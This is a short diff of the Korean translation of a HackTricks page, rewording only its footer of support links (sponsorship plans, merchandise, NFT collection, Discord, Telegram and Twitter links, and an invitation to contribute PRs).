@@ -1716,10 +1770,10 @@ esac
 
 HackTricks를 지원하는 다른 방법:
 
-* **회사가 HackTricks에 광고되길 원하거나** **PDF로 HackTricks를 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* **회사가 HackTricks에 광고되길 원하거나** **PDF로 HackTricks를 다운로드하길 원한다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
 * [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)이나 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
-* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.
+* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유하세요.**
 
 </details>
